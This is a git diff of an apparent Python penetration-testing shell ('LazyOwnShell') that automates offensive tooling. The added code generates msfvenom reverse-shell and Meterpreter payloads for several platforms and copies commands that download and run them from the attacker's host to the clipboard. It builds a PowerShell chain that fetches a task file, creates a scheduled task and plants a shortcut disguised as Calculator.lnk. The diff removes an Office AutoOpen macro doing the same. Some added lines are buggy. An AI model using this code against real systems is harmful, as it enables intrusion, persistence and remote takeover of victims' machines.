@@ -709,23 +709,34 @@ class LazyOwnShell(Cmd):
             f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf'
         )
         os.system(
+            f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell64.elf'
+        )
+        os.system(
             f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe'
+        )
+        os.system(
+            f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell64.exe'
         )
         os.system(
             f'msfvenom -p osx/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho'
         )
+        os.system(
+            f'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell64.macho'
+        )
+        print(f"    {RED}[*] LHOST={lhost} LPORT={lport}")
         
-        print(f"   [*] LHOST={lhost} LPORT={lport}")
-        
-        os.system("mv shell.* sessions")
+        os.system("mv shell* sessions")
         os.system("chmod +x sessions/*")
-        print("    [*] Lazy MSFVenom Reverse_shell payloads in sessions/ ")
-        print("    [*] upx to bins to smaller bins")
+        print(f"    {GREEN}[*] Lazy MSFVenom Reverse_shell payloads in sessions/ ")
+        print(f"    {MAGENTA}[*] upx to bins to smaller bins{CYAN}")
         os.system("upx sessions/shell.elf")
         os.system("upx sessions/shell.macho")
         os.system("upx sessions/shell.exe")
-        
-        print("    [?] To run web server exec command: www or lazywebshell [;,;] ")
+        os.system("upx sessions/shell64.elf")
+        os.system("upx sessions/shell64.macho")
+        os.system("upx sessions/shell64.exe")        
+        os.system(f"echo 'curl http://{lhost}/shell.exe -o s.exe' | xclip -sel clip")
+        print(f"    {YELLOW}[?] To run web server exec command: {GREEN}www {YELLOW}or {GREEN}lazywebshell {RED}[;,;] curl -o s.exe http://{lhost}/shell.exe copy to clipboard :D {RESET}")
         return
 
     def run_lazyaslrcheck(self):
@@ -1249,6 +1260,7 @@ class LazyOwnShell(Cmd):
 
         print("    [*] ejecutando Lazy Proxy ...")
         os.system(f"python3 modules/lazyproxy.py")
+        print(f"    {RED}[*] {YELLOW} Shutdown proxy server at sessions in port {RED} 8888 {RESET}")
         return
 
     def do_createwebshell(self, line):
@@ -1399,6 +1411,7 @@ class LazyOwnShell(Cmd):
         print(f"    [+] Try ... bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
         os.system(f"echo \"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" |  xclip -sel clip")
         return
+        
     def do_conptyshell(self,line):
         """Download ConPtyShell in sessions directory and copy to clipboard the command :D """
         lhost = self.params["lhost"]
@@ -1412,6 +1425,7 @@ class LazyOwnShell(Cmd):
         os.system(f"echo '{cmd}' |  xclip -sel clip")
         print(f"    {GREEN}[+]{cmd} {YELLOW} Copied to clipboard :D {RESET}")
         return
+
     def do_nc(self,line):
         """run nc -lvnp 6666 :) """
         lport = self.params["lport"]
@@ -1424,7 +1438,9 @@ class LazyOwnShell(Cmd):
         else:
             print(f"    {GREEN}[+] Try.. nc -lvnp {line}{RESET}")
             os.system(f"stty raw -echo; (stty size; cat) | nc -lvnp {line}")
+        print(f"    {RED}[*] {YELLOW} Shutdown nc sessions in port {RED} [{lport}|{line}] {RESET}")
         return
+
     def do_sh(self,line):
         """execute some command direct in shell to avoid exit LazyOwn ;)"""
         if not line:
@@ -1532,6 +1548,7 @@ class LazyOwnShell(Cmd):
         """Open vpn like htb vpn"""
         print("    [+] Try... sudo openvpn *.ovpn")
         os.system("sudo openvpn *.ovpn")
+        print(f"    {RED}[*] {YELLOW} Shutdown vpn {RED} [;,;] {RESET}")
         return
 
     def do_www(self, line):
@@ -1585,6 +1602,16 @@ class LazyOwnShell(Cmd):
         os.system(f"echo 'cmd.exe /c curl -OJ http://{lhost}/Rubeus.exe' | xclip -sel clip")
         return
 
+    def do_socat(self, line):
+        """run socat in ip:port seted by argument config the port 1080 in /etc/proxychains.conf"""
+        print(f"    {YELLOW}[+] you must seted {GREEN}socks5 127.0.0.1 1080 {YELLOW}at {GREEN}/etc/proxychains.conf{RESET}")
+        if not line:
+            print(f"    [?]{YELLOW} you must pass ip:port by argument ex:{GREEN} socat 10.10.10:445  {WHITE} more help: {CYAN} help socat{RESET} ")
+            return
+        os.system(f'socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080')
+        print(f"    {RED}[*] {YELLOW} Shutdown socat tunnel at sessions in port {RED} 1080 {RESET}")
+        return
+
     def do_msf(self, line):
         """automate msfconsole scan or rev shell"""
         if not line:
@@ -1633,11 +1660,31 @@ class LazyOwnShell(Cmd):
             # Ejecutar Metasploit con el archivo de comandos
             subprocess.run(['msfconsole', '-r', rc_file_path], check=True)
 
-            # Eliminar el archivo temporal
-            os.remove(rc_file_path)
+            if os.path(rc_file_path):
+                os.remove(rc_file_path)
+                # Eliminar el archivo temporal
+            print(f"    {RED}[*] {YELLOW} Shutdown msfconsole scan {RED} [;,;] {RESET}")
             return
         elif line.startswith("rev"):
             """Automate msfconsole exploit setup"""
+            args = line.split(' ')
+            
+            if len(args) == 1:
+                setpayload = 'windows/meterpreter/reverse_tcp'
+            elif len(args) == 2:
+                if args[1] == 'win':
+                    setpayload = 'windows/meterpreter/reverse_tcp'
+                if args[1] == 'win64':
+                    setpayload = 'windows/x64/meterpreter/reverse_tcp'
+                elif args[1] == 'lin':
+                    setpayload = 'linux/x86/meterpreter/reverse_tcp'
+                elif args[1] == 'lin64':
+                    setpayload = 'linux/x64/meterpreter/reverse_tcp'    
+                elif args[1] == 'mac':
+                    setpayload = 'osx/x86/shell_reverse_tcp'
+                elif args[1] == 'mac64':
+                    setpayload = 'osx/x64/meterpreter/reverse_tcp'
+
             lhost = self.params["lhost"]
             lport = self.params["lport"]
             if not lhost or not lport:
@@ -1654,7 +1701,7 @@ class LazyOwnShell(Cmd):
             with open(rc_file_path, 'w') as file:
                 file.write(f"""
                 use exploit/multi/handler
-                set payload windows/meterpreter/reverse_tcp
+                set payload {setpayload}
                 set LHOST {lhost}
                 set LPORT {lport}
                 run
@@ -1664,8 +1711,11 @@ class LazyOwnShell(Cmd):
             subprocess.run(['msfconsole', '-r', rc_file_path], check=True)
 
             # Eliminar el archivo temporal
-            os.remove(rc_file_path)
+            if os.path(rc_file_path):
+                os.remove(rc_file_path)
+            print(f"    {RED}[*] {YELLOW} Shutdown rev meterpreter sessions {RED} [;,;] {RESET}")
             return
+
         elif line.startswith("lnk"):
             # Parámetros necesarios
             lhost = self.params["lhost"]
@@ -1678,14 +1728,22 @@ class LazyOwnShell(Cmd):
             lport = f"{lport}"  # Puedes cambiar el puerto si lo necesitas
             
             web_root = "sessions"
-            docx_path = "C:\\users\\public\\downloads\\Document.docx"  # Ruta al documento de Office
-
+            payload = "C:\\xampp\\htdocs\\payload.exe"  # Ruta al payload
+            args = line.split(' ')
             if not lhost or not lport:
                 print("    [-] lhost o lport deben estar establecidos. Usa 'set lhost <ip>'")
             else:
+                if len(args) == 1:
+                    setpayload = 'windows/meterpreter/reverse_tcp'
+                elif len(args) == 2:
+                    if args[1] == 'win':
+                        setpayload = 'windows/meterpreter/reverse_tcp'
+                    if args[1] == 'win64':
+                        setpayload = 'windows/x64/meterpreter/reverse_tcp'
+                              
                 # Paso 1: Crear el payload con msfvenom
                 payload_path = os.path.join(web_root, "payload.exe")
-                msfvenom_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {payload_path}"
+                msfvenom_cmd = f"msfvenom -p {setpayload} LHOST={lhost} LPORT={lport} -f exe -o {payload_path}"
                 subprocess.run(msfvenom_cmd, shell=True, check=True)
                 print("    [+] Payload creado con éxito en", payload_path)
 
@@ -1703,22 +1761,16 @@ class LazyOwnShell(Cmd):
                     xml_file.write(xml_content)
                 print("    [+] Archivo XML creado con éxito en", xml_path)
 
-                # Paso 3: Crear la macro en un documento de Office (contenido de la macro)
-                macro_content = f"""
-                Sub AutoOpen()
-                    CreateObject("WScript.Shell").Run "powershell -Command \\"Invoke-WebRequest -Uri 'http://{lhost}/download_payload.xml' -OutFile 'C:\\Windows\\Temp\\download_payload.xml'; schtasks /create /tn 'DownloadPayload' /xml 'C:\\Windows\\Temp\\download_payload.xml' /f; schtasks /run /tn 'DownloadPayload'\\""
-                End Sub
-                """
                 # Este paso debe realizarse manualmente: Inserta la macro en tu documento de Office y guárdalo en la ruta especificada.
-                print(f"    [+] Asegúrate de que el documento de Office con la macro esté en: {docx_path}")
+                print(f"    [+] Asegúrate de que el payload esté en: {payload}")
 
                 # Paso 4: Crear el archivo .lnk con PowerShell
                 ps_script_content = f"""
                 $WshShell = New-Object -ComObject WScript.Shell
-                $Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\\Desktop\\Document.lnk")
-                $Shortcut.TargetPath = "{docx_path}"
+                $Shortcut = $WshShell.CreateShortcut("c:\Common Applications\Calculator.lnk")
+                $Shortcut.TargetPath = "{payload}"
                 $Shortcut.Save()
-                """
+                """.replace('                ','')
                 ps_script_path = os.path.join("sessions", "create_lnk.ps1")
                 with open(ps_script_path, 'w') as ps_script_file:
                     ps_script_file.write(ps_script_content)
@@ -1727,7 +1779,7 @@ class LazyOwnShell(Cmd):
                 print("    [+] Ejecuta este script en la máquina Windows para crear el archivo .lnk")
 
                 # Nota: Este paso debe ejecutarse en la máquina Windows
-                cmd = """echo 'powershell -ExecutionPolicy Bypass -File create_lnk.ps1' | xclip -sel clip"""
+                cmd = """echo 'powershell -Command \\"Invoke-WebRequest -Uri \'http://{lhost}/download_payload.xml\' -OutFile \'C:\\Windows\\Temp\\download_payload.xml\'; schtasks /create /tn \'DownloadPayload\' /xml \'C:\\Windows\\Temp\\download_payload.xml\' /f; schtasks /run /tn \'DownloadPayload\' ; powershell -ExecutionPolicy Bypass -File create_lnk.ps1' | xclip -sel clip"""
                 print(f"    [+] El payload y los archivos necesarios han sido generados exitosamente. el comando {cmd} se copio en la clipboard, ejecute www para diponer los archivos mediante un servidor web")
                 os.system(cmd)
                 return
